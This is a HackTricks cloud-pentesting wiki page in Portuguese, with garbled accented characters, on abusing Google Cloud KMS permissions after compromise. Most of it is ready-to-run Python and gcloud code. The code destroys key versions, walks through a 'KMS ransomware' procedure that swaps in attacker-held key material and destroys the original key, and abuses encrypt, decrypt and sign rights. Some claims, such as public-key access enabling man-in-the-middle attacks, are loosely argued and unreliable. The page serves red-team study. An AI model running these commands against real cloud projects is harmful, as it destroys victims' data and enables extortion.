# GCP - KMS Post Exploitation

{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## KMS

Encontre informa√ß√µes b√°sicas sobre KMS em:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

Um atacante com essa permiss√£o poderia destruir uma vers√£o do KMS. Para fazer isso, primeiro voc√™ precisa desativar a chave e depois destru√≠-la:
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

No AWS √© poss√≠vel **roubar completamente uma chave KMS** modificando a pol√≠tica de recursos KMS e permitindo apenas que a conta do atacante use a chave. Como essas pol√≠ticas de recursos n√£o existem no GCP, isso n√£o √© poss√≠vel.

No entanto, h√° outra maneira de realizar um KMS Ransomware global, que envolveria os seguintes passos:

* Criar uma nova **vers√£o da chave com um material de chave** importado pelo atacante

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* Defina como **vers√£o padr√£o** (para dados futuros sendo criptografados)
* **Recriptografe dados antigos** criptografados com a vers√£o anterior com a nova.
* **Exclua a chave KMS**
* Agora, apenas o atacante, que possui o material da chave original, poder√° descriptografar os dados criptografados

#### Aqui est√£o os passos para importar uma nova vers√£o e desativar/excluir os dados antigos:
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

Essas permiss√µes permitem que um invasor use uma chave KMS para criptografar dados. Isso pode ser √∫til para proteger dados exfiltrados ou para outros fins maliciosos.

#### Abusando da Permiss√£o

Para abusar dessa permiss√£o, voc√™ pode usar o seguinte comando gcloud:

```sh
gcloud kms encrypt \
  --location <location> \
  --keyring <keyring> \
  --key <key> \
  --plaintext-file <plaintext-file> \
  --ciphertext-file <ciphertext-file>
```

### `cloudkms.cryptoKeyVersions.useToDecrypt` | `cloudkms.cryptoKeyVersions.useToDecryptViaDelegation`

Essas permiss√µes permitem que um invasor use uma chave KMS para descriptografar dados. Isso pode ser √∫til para acessar dados sens√≠veis que foram criptografados.

#### Abusando da Permiss√£o

Para abusar dessa permiss√£o, voc√™ pode usar o seguinte comando gcloud:

```sh
gcloud kms decrypt \
  --location <location> \
  --keyring <keyring> \
  --key <key> \
  --ciphertext-file <ciphertext-file> \
  --plaintext-file <plaintext-file>
```
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

### Descri√ß√£o

Permiss√£o para usar vers√µes de chaves criptogr√°ficas para assinar dados.

### Exemplo de comando Gcloud

```bash
gcloud kms keys versions sign --location <location> --keyring <keyring> --key <key> --version <version> --digest-algorithm <digest-algorithm> --digest <digest>
```

### Exemplo de comando Curl

```bash
curl -X POST -H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
"https://cloudkms.googleapis.com/v1/projects/<project>/locations/<location>/keyRings/<keyring>/cryptoKeys/<key>/cryptoKeyVersions/<version>:asymmetricSign" \
-d '{
  "digest": {
    "<digest-algorithm>": "<digest>"
  }
}'
```

### `cloudkms.cryptoKeyVersions.useToDecrypt`

### Descri√ß√£o

Permiss√£o para usar vers√µes de chaves criptogr√°ficas para descriptografar dados.

### Exemplo de comando Gcloud

```bash
gcloud kms keys versions decrypt --location <location> --keyring <keyring> --key <key> --version <version> --ciphertext-file <ciphertext-file> --plaintext-file <plaintext-file>
```

### Exemplo de comando Curl

```bash
curl -X POST -H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
"https://cloudkms.googleapis.com/v1/projects/<project>/locations/<location>/keyRings/<keyring>/cryptoKeys/<key>/cryptoKeyVersions/<version>:decrypt" \
-d '{
  "ciphertext": "<ciphertext>"
}'
```
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

Esta permiss√£o permite que o usu√°rio verifique assinaturas usando uma vers√£o de chave criptogr√°fica espec√≠fica. Se um invasor obtiver acesso a esta permiss√£o, ele poder√° verificar a autenticidade de mensagens ou dados assinados, o que pode ser √∫til em ataques de engenharia social ou para validar dados interceptados.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Esta permiss√£o permite que o usu√°rio visualize a chave p√∫blica de uma vers√£o de chave criptogr√°fica espec√≠fica. Com acesso a esta permiss√£o, um invasor pode obter a chave p√∫blica e us√°-la para criptografar dados que s√≥ podem ser descriptografados com a chave privada correspondente, potencialmente facilitando ataques de intercepta√ß√£o ou man-in-the-middle.

### `cloudkms.cryptoKeys.get`

Esta permiss√£o permite que o usu√°rio obtenha metadados sobre uma chave criptogr√°fica espec√≠fica. Um invasor com esta permiss√£o pode coletar informa√ß√µes sobre as chaves criptogr√°ficas em uso, incluindo suas pol√≠ticas de uso e estado, o que pode ajudar no planejamento de ataques mais direcionados.

### `cloudkms.cryptoKeys.list`

Esta permiss√£o permite que o usu√°rio liste todas as chaves criptogr√°ficas em um projeto ou local espec√≠fico. Se um invasor obtiver esta permiss√£o, ele poder√° mapear todas as chaves dispon√≠veis, facilitando a identifica√ß√£o de alvos valiosos para ataques subsequentes.
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
